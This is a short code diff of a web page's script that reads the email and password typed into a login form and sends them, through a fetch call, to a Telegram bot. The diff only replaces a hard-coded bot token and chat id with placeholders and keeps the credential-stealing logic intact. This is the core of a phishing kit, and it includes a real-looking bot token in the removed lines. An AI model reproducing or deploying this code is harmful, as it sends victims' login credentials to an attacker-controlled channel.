@@ -18,8 +18,8 @@
         const pass = document.getElementById('pass').value
 
         if (email && pass) {
-          const token = "6883619016:AAHKPuXrO6Tt60aOhx4pMvuiBgpGH8gpXww"
-          const chat_id = "7139961821"
+          const token = "your_bot_token"
+          const chat_id = "your_chat_id"
           const msg = `Email: ${email}\nPass: ${pass}`
 
           fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
